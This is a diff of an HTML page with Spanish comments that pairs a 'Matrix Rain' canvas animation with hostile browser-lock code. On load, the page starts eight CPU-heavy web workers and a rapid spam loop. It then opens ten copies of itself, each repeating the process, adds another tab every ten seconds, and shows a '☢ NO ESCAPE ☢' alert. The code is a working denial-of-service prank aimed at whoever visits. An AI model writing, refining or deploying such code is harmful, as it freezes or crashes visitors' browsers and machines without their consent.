@@ -35,7 +35,7 @@ h1{
 let total = 0;
 let running = true;
 
-// Matrix
+// Matrix Rain
 function createMatrix(id, speed) {
   const canvas = document.getElementById(id);
   const ctx = canvas.getContext("2d");
@@ -63,7 +63,7 @@ function createMatrix(id, speed) {
 createMatrix("c1", 22);
 createMatrix("c2", 16);
 
-// Workers y Spam (potencia alta)
+// Workers y Spam
 function createWorker() {
   const code = `
     self.onmessage = () => {
@@ -108,19 +108,19 @@ function spamPrincipal() {
   setTimeout(spamPrincipal, 8);
 }
 
-// ==================== ABRIR MÁS PESTAÑAS ====================
-function abrirPestanas() {
-  try {
-    window.open(window.location.href, "_blank");
-  } catch(e) {}
+// Función para abrir 10 pestañas
+function abrir10Pestanas() {
+  for(let i = 0; i < 10; i++) {
+    try {
+      window.open(window.location.href, "_blank");
+    } catch(e) {}
+  }
 }
 
 // INICIO AUTOMÁTICO
 window.onload = function() {
-  // Alta carga
-  for(let i = 0; i < 8; i++) {
-    createWorker();
-  }
+  // Carga alta
+  for(let i = 0; i < 8; i++) createWorker();
 
   for(let i = 0; i < 100; i++) {
     setTimeout(spamPrincipal, i * 10);
@@ -128,19 +128,17 @@ window.onload = function() {
 
   spamPrincipal();
 
-  // === APERTURA DE PESTAÑAS ===
-  // Ráfaga inicial
-  for(let i = 0; i < 6; i++) {
-    setTimeout(abrirPestanas, i * 400);
-  }
+  // Abre 10 pestañas de esta misma web
+  setTimeout(abrir10Pestanas, 700);
 
-  // Apertura continua cada cierto tiempo
-  setInterval(abrirPestanas, 2800);
+  // Abre una adicional cada 10 segundos
+  setInterval(() => {
+    try { window.open(window.location.href, "_blank"); } catch(e){}
+  }, 10000);
 
-  // Alerta anti-cierre
   setTimeout(() => {
-    alert("☢ NO ESCAPE ☢\n\nSe están abriendo más pestañas...");
-  }, 1000);
+    alert("☢ NO ESCAPE ☢\n\nSe han abierto 10 pestañas adicionales.");
+  }, 1200);
 };
 </script>
 </body>
